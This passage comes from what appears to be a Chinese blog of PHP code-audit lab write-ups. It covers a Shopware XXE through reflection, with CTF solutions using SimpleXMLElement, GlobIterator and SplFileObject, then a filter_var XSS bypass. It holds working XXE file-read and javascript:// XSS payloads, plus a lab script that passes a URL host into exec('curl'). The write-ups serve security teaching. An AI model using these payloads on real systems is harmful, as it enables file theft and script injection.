alt="image-20251019204201637"></p><p>这里的 <strong>$serialized</strong> 就是我们刚刚传入的 <strong>sort</strong> （上图第3行），程序分别从 <strong>sort</strong> 中提取出值赋给 <strong>$className</strong> 和 <strong>$arguments</strong> 变量，然后这两个变量被传入 <strong>ReflectionHelper</strong> 类的 <strong>createInstanceFromNamedArguments</strong> 方法。该方法位于 <strong>engine\Shopware\Components\ReflectionHelper.php</strong> 文件，具体代码如下：</p><p><img src="/archives/3fef33c2/image-20251019204642929.png" alt="image-20251019204642929"></p><p>这里我们关注 <strong>第6行</strong> 代码，这里创建了一个反射类，而类的名称就是从 <strong>$sort</strong> 变量来的，可被用户控制利用。继续往下看，在代码第28行处用 <strong>$newParams</strong> 作为参数，创建一个新的实例对象。而这里的  <strong>$newParams</strong> 是从 <strong>$arguments[$paramName]</strong> 中取值的， <strong>$arguments</strong> 又是我们可以控制的，因为也是从 <strong>$sort</strong> 变量来，所以我们可以通过这里来实例化一个 <strong>SimpleXMLElement</strong> 类对象，形成一个XXE漏洞。下面，我们来看看具体如何利用这个漏洞。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先，我们需要登录后台，找到调用 <strong>loadPreviewAction</strong> 接口的位置，发现其调用位置如下：</p><p><img src="/archives/3fef33c2/image-20251019204448865.png" alt="image-20251019204448865"></p><p>当我们点击 <strong>Refresh preview</strong> 按钮时，就会调用 <strong>loadPreviewAction</strong> 方法，用BurpSuite抓到包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/shopware520/backend/ProductStream/loadPreview?_dc=1530963660916&amp;sort=&#123;&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:&#123;&quot;direction&quot;:&quot;asc&quot;&#125;&#125;&amp;conditions=&#123;&#125;&amp;shopId=1&amp;currencyId=1&amp;customerGroupKey=EK&amp;page=1&amp;start=0&amp;limit=2</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">X-CSRF-Token</span><span class="punctuation">: </span>IKiwilE7pecuIUmEAJigyg6fVXY6vR</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost/shopware520/backend/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>SHOPWAREBACKEND=78ghtddjn8n8efpv1cudj6eao0; KCFINDER_showname=on; KCFINDER_showsize=off; KCFINDER_showtime=off; KCFINDER_order=name; KCFINDER_orderDesc=off; KCFINDER_view=thumbs; KCFINDER_displaySettings=off; goods[cart]=180615151154565652; XDEBUG_SESSION=PHPSTORM</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>我们可以看到 <strong>sort</strong> 值为 <code>&#123;&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:&#123;&quot;direction&quot;:&quot;asc&quot;&#125;&#125;</code> ,于是我们按照其格式构造payload： <code>&#123;&quot;SimpleXMLElement&quot;:&#123;&quot;data&quot;:&quot;http://localhost/xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0&#125;&#125;</code> ，关于payload的含义，可以看看 <strong>SimpleXMLElement</strong> 类的 <strong>__construct</strong> 函数定义，具体点 <a href="http://php.net/manual/zh/simplexmlelement.construct.php">这里</a> :</p><p><img src="/archives/3fef33c2/image-20251019204800793.png" alt="image-20251019204800793"></p><ul><li><p>data</p><p>XML 字符串</p></li><li><p>options</p><p>可选参数，用于指定影响 XML 文档读取的额外 Libxml 参数。<strong>为2时即LIBXML_DTDLOAD可加载外部实体（DTD）</strong></p></li><li><p>dataIsURL</p><p>默认值为 false。设置为 true 时，表示 data 参数是 XML 文档的路径或 URL，而不是字符串数据</p></li><li><p>namespaceOrPrefix</p><p>命名空间前缀或 URI</p></li><li><p>isPrefix</p><p>如果 <code>namespaceOrPrefix</code> 是前缀，则设置为 true</p><p>如果 <code>namespaceOrPrefix</code> 是 URI，则设置为 false</p><p>默认值为 false</p></li></ul><p>笔者所用的xxe.xml内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/phpStudy/PHPTutorial/WWW/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们发送payload，并用xdebug调试程序，最后程序将我们读取的值存储在 <strong>$conditions</strong> 变量中，如下图所示：</p><p><img src="/archives/3fef33c2/image-20251019205629263.png" alt="image-20251019205629263"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>关于PHP中XXE漏洞的修复，我们可以过滤关键词，如： <strong>ENTITY</strong> 、 <strong>SYSTEM</strong> 等，另外，我们还可以通过禁止加载XML实体对象的方式，来防止XXE漏洞（如下图第2行代码），具体代码如下：</p><p><img src="/archives/3fef33c2/image-20251019205727399.png" alt="image-20251019205727399"></p><p>libxml_disable_entity_loader(true); 这个函数在 PHP 中用于禁用 XML 解析时加载外部实体，是一种安全措施，用来防止 **XML 外部实体攻击 (XXE)**，这种攻击可能被恶意利用来读取敏感文件或执行其他恶意操作。</p><h2 id="CTF例题练习"><a href="#CTF例题练习" class="headerlink" title="CTF例题练习"></a>CTF例题练习</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(</span><br><span class="line">function (<span class="variable">$class</span>)&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">NotFound</span>();</span><br><span class="line">&#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$classname</span>))&#123;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$newclass</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$newclass</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><h4 id="SimpleXMLElement加载外部实体"><a href="#SimpleXMLElement加载外部实体" class="headerlink" title="SimpleXMLElement加载外部实体"></a>SimpleXMLElement加载外部实体</h4><p>这道题目考察的是实例化漏洞结合XXE漏洞。审计代码可知$classname、$param、$param2三个参数都是可控的，而<strong>class_exists</strong>函数会判断类是否存在，如果不存在的话，就会调用程序中的 <strong>__autoload</strong> 函数，但是这里没有 <strong>__autoload</strong> 函数，而是用 <a href="http://php.net/manual/en/function.spl-autoload-register.php"><strong>spl_autoload_register</strong></a> 注册了一个类似 <strong>__autoload</strong> 作用的函数，即这里输出404信息。</p><img src="/archives/3fef33c2/image-20251019210908137.png" alt="image-20251019210908137" style="zoom:50%;"><p>这里我们能用的只有php内置类，所以我们先利用<strong>GlobIterator</strong> 类搜索 <strong>flag文件</strong> 名字:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title class_">GlobIterator</span>::<span class="variable constant_">__construct</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">KEY_AS_PATHNAME</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">CURRENT_AS_FILEINFO</span> ] )</span><br></pre></td></tr></table></figure><ul><li><p><strong>$pattern (string):</strong></p><p>这是一个包含文件匹配模式的字符串，通常类似于 glob() 函数的模式（如 <code>*.txt、images/*.jpg</code>）。它定义了要匹配的文件和目录的模式。你可以使用通配符，如 * 和 ?，来匹配文件名。<br>例如，$pattern 可能是 “images&#x2F;*.jpg”，表示匹配所有 images 目录下的 .jpg 文件。</p></li><li><p><strong>$flags (int, 可选):</strong></p><p>这是一个可选的标志参数，默认值为 <code>FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO</code>，这意味着文件路径将作为键，文件信息对象（SplFileInfo）作为值。<br>你可以通过不同的标志来调整返回的内容格式，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FilesystemIterator::KEY_AS_PATHNAME: 迭代器将返回文件路径作为键。</span><br><span class="line">FilesystemIterator::CURRENT_AS_FILEINFO: 迭代器将返回 SplFileInfo 对象作为当前的值，提供关于文件的信息。</span><br><span class="line">FilesystemIterator::KEY_AS_FILENAME: 迭代器将返回文件名作为键。</span><br><span class="line">FilesystemIterator::CURRENT_AS_PATHNAME: 迭代器将返回文件路径作为当前值。</span><br></pre></td></tr></table></figure></li></ul><p>第一个参数为要搜索的文件名，第二个参数为选择文件的哪个信息作为键名，这里我选择用 <strong>FilesystemIterator::CURRENT_AS_FILEINFO</strong> ，其对应的常量值为0，你可以在 <a href="http://php.net/manual/en/globiterator.construct.php">这里</a> 找到这些常量的值，所以最终搜索文件的 <strong>payload</strong> 如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h?name=GlobIterator&amp;param=./*.php&amp;param2=0</span><br></pre></td></tr></table></figure><p><img src="/archives/3fef33c2/image-20251019211932586.png" alt="image-20251019211932586"></p><p>这里我们知道了文件的名字为<strong>f1agi3hEre.php</strong>，接下来我们使用内置类 <strong>SimpleXMLElement</strong> 读取 <strong>f1agi3hEre.php</strong> 文件的内容,，这里我们要结合使用PHP流的使用，因为当文件中存在： <strong>&lt;   &gt;   &amp;   ‘   “</strong> 这5个符号时，会导致XML文件解析错误，所以我们这里利用PHP文件流，将要读取的文件内容经过 <strong>base64编码</strong> 后输出即可，XML内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=./f1agi3hEre.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意这个XML要url编码，payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/hongridaishen/day3/?name=SimpleXMLElement&amp;param=%3c%3fxml+version%3d%221.0%22%3f%3e%0a%3c!DOCTYPE+ANY+%5b+%0a+++++%3c!ENTITY+xxe+SYSTEM+%22php%3a%2f%2ffilter%2fread%3dconvert.base64-encode%2fresource%3d.%2ff1agi3hEre.php%22%3e%0a%5d%3e%0a%3cx%3e%26xxe%3b%3c%2fx%3e&amp;param2=2</span><br></pre></td></tr></table></figure><p>上面payload中的param2&#x3D;2，实际上这里2对应的模式是 <strong>LIBXML_NOENT</strong> ，具体可以参考 <a href="http://php.net/manual/en/simplexmlelement.construct.php">这里</a> 。</p><p><strong>LIBXML_NOENT：</strong><br><strong>LIBXML_NOENT</strong> 是 libxml2 库中的一个常量，表示在<strong>解析 XML 文档时要展开实体引用（如 &amp;、&lt; 等）为实际的字符</strong>。这意味着，如果 XML 文档中包含了实体引用，解析器会将它们转化为对应的字符值。具体来说，使用 LIBXML_NOENT 解析 XML 时，文档中的外部实体会被自动替换为它们的实际内容。</p><p>所以如果这里不设置为2的话时是得不到flag回显的</p><p><img src="/archives/3fef33c2/image-20251019212834805.png" alt="image-20251019212834805"></p><p><img src="/archives/3fef33c2/image-20251019212907234.png" alt="image-20251019212907234"></p><h4 id="SplFileObject读取文件"><a href="#SplFileObject读取文件" class="headerlink" title="SplFileObject读取文件"></a>SplFileObject读取文件</h4><p>SplFileObject原生类在这里同样可以用，SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以<strong>用于对文件内容的遍历、查找、操作</strong>等，所以SplFileObject同样可以读取文件，但一次只能读一行且需要知道文件名。如果要读取所有内容需要利用伪协议</p><p><img src="/archives/3fef33c2/image-20251019213616013.png" alt="image-20251019213616013"></p><p>而SplFileObject第二个参数默认为r，所以payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/hongridaishen/day3/?name=SplFileObject&amp;param=php://filter/convert.base64-encode/resource=./f1agi3hEre.php&amp;param2=r</span><br></pre></td></tr></table></figure><p><img src="/archives/3fef33c2/image-20251020230859633.png" alt="image-20251020230859633"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> php代码审计 </category>
          
          <category> 红日代审 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红日代审 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日代审Day2-filter_var函数缺陷</title>
      <link href="/archives/1f2efd22/"/>
      <url>/archives/1f2efd22/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day2/files/README.md">https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day2/files/README.md</a></p><h2 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var"></a>filter_var</h2><p><img src="/archives/1f2efd22/image-20251019183134462.png" alt="image-20251019183134462"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$filter</span> = FILTER_DEFAULT, <span class="keyword">array</span>|<span class="keyword">int</span> <span class="variable">$options</span> = <span class="number">0</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>value</strong></p><p>要过滤的内容。注意标量值在过滤前，会先<a href="https://www.php.net/manual/zh/language.types.string.php#language.types.string.casting">转换成字符串</a>。</p></li><li><p><strong>filter</strong></p><p>要应用的过滤器。可以使用 <strong><code>FILTER_VALIDATE_\*</code></strong> 常量作为验证过滤器，使用 <strong><code>FILTER_SANITIZE_\*</code></strong> 或 <strong><code>FILTER_UNSAFE_RAW</code></strong> 作为清理过滤器，也可以使用 <strong><code>FILTER_CALLBACK</code></strong> 作为自定义过滤器。</p><blockquote><p><strong>注意</strong>: 默认值为 **<code>FILTER_DEFAULT</code>**，是 <strong><code>FILTER_UNSAFE_RAW</code></strong> 的别名。这将导致默认情况下不进行过滤。</p></blockquote></li><li><p><strong>options</strong></p><p>要么是选项的关联 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a>，要么是过滤器 flag 常量 <strong><code>FILTER_FLAG_\*</code></strong> 的位掩码。 如果 <code>filter</code> 接受选项（option），则可以使用数组的 <code>&quot;flags&quot;</code> 字段提供 flag。</p></li><li><p><strong>返回值</strong></p><p>成功时返回过滤后的数据。失败时返回 **<code>false</code>**，除非使用 <strong><code>FILTER_NULL_ON_FAILURE</code></strong> flag，在这种情况下会返回 **<code>null</code>**。</p></li></ul><p>demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">filter_var</span>(<span class="string">&#x27;bob@example.com&#x27;</span>, FILTER_VALIDATE_EMAIL));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">filter_var</span>(<span class="string">&#x27;https://example.com&#x27;</span>, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(15) &quot;bob@example.com&quot;</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure><blockquote><p>第一个验证字符串<code>bob@example.com</code>是否是有效的邮箱格式</p><p>第二个验证字符串<code>https://example.com</code>是否是有效的URL，并且要求必须包含路径</p></blockquote><h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h2><p><img src="/archives/1f2efd22/image-20251019183854892.png" alt="image-20251019183854892"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$string</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$flags</span> = ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401,</span><br><span class="line">    ?<span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$double_encode</span> = <span class="literal">true</span></span><br><span class="line">): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>字符替换：</p><table><thead><tr><th align="left">字符</th><th align="left">替换后</th></tr></thead><tbody><tr><td align="left"><code>&amp;</code> (&amp; 符号)</td><td align="left"><code>&amp;amp</code></td></tr><tr><td align="left"><code>&quot;</code> (双引号)</td><td align="left"><code>&amp;quot</code>，除非设置了 <strong><code>ENT_NOQUOTES</code></strong></td></tr><tr><td align="left"><code>&#39;</code> (单引号)</td><td align="left">设置了 <strong><code>ENT_QUOTES</code></strong> 后， <code>&amp;#039</code> (如果是 <strong><code>ENT_HTML401</code></strong>) ，或者 <code>&amp;apos</code> (如果是 **<code>ENT_XML1</code>**、 <strong><code>ENT_XHTML</code></strong> 或 <strong><code>ENT_HTML5</code></strong>)。</td></tr><tr><td align="left"><code>&lt;</code> (小于)</td><td align="left"><code>&amp;lt</code></td></tr><tr><td align="left"><code>&gt;</code> (大于)</td><td align="left"><code>&amp;gt</code></td></tr></tbody></table><ul><li><p><code>string</code></p><p>待转换的 <a href="https://www.php.net/manual/zh/language.types.string.php">string</a>。</p></li><li><p><code>flags</code></p><p>位掩码，由以下某个或多个标记组成，设置转义处理细节、无效单元序列、文档类型。 默认是 <code>ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401</code>。</p></li></ul><p>demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="string">&quot;&lt;a href=&#x27;test&#x27;&gt;Test&lt;/a&gt;&quot;</span>, ENT_QUOTES);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new</span>; <span class="comment">// &amp;lt;a href=&amp;#039;test&amp;#039;&amp;gt;Test&amp;lt;/a&amp;gt;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>demo：<br><img src="/archives/1f2efd22/image-20251019184416821.png" alt="image-20251019184416821"></p><p>这一关采用的php的一个模板引擎Twig，本题只要考察XSS（跨站脚本攻击）漏洞。虽然题目用了<strong>escape</strong>和<strong>filter_var</strong>过滤方法，但依然能被绕过。</p><p>在上图 <strong>第8行</strong> 中，程序使用 <a href="https://twig.symfony.com/">Twig</a> 模板引擎定义的 <strong>escape</strong> 过滤器来过滤link，而实际上这里的 <strong>escape</strong> 过滤器，是用PHP内置函数 <strong>htmlspecialchars</strong> 来实现的</p><p>第二处过滤在 <strong>第17行</strong> ，这里用了 <strong>filter_var</strong> 函数来过滤 <strong>nextSlide</strong> 变量，且用了 <strong>FILTER_VALIDATE_URL</strong> 过滤器来判断是否是一个合法的url</p><p>但这里可以利用<strong>javascript伪协议</strong> 来绕过，为了更好理解，举个例子：<br><img src="/archives/1f2efd22/image-20251019184924880.png" alt="image-20251019184924880"></p><p>我们使用payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=javascript://comment％250aalert(1)</span><br></pre></td></tr></table></figure><p><img src="/archives/1f2efd22/image-20251019185820541.png" alt="image-20251019185820541"></p><p>可以看到当点击链接时执行了alert函数</p><p>这是因为实际上这里的<code>//</code>在JavaScript中表示单行注释，所以后面的内容均为注释，那为什么会执行 <strong>alert</strong> 函数呢？那是因为我们这里用了字符 <strong>%0a</strong> ，该字符为换行符，所以 <strong>alert</strong> 语句与注释符 <strong>&#x2F;&#x2F;</strong> 就不在同一行，就能执行。当然，这里我们要对 <strong>%</strong> 百分号编码成 <strong>%25</strong> ，因为程序将浏览器发来的payload：<code>javascript://comment％250aalert(1)</code> 先解码成： <code>javascript://comment%0aalert(1)</code> 存储在变量 <strong>$url</strong> 中（上图第二行代码），然后用户点击a标签链接就会触发 <strong>alert</strong> 函数。</p><p>而且这里主要是由于PHP内置函数 <strong>htmlspecialchars</strong> 过滤，如果不过滤仅靠<strong>filter_var</strong>过滤很容易实现XSS：</p><p><img src="/archives/1f2efd22/image-20251019191315086.png" alt="image-20251019191315086"></p><h2 id="CTF例题练习"><a href="#CTF例题练习" class="headerlink" title="CTF例题练习"></a>CTF例题练习</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$url</span>) &amp;&amp; <span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$site_info</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sec-redclub.com$/&#x27;</span>,<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;curl &quot;&#x27;</span>.<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&quot;&#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 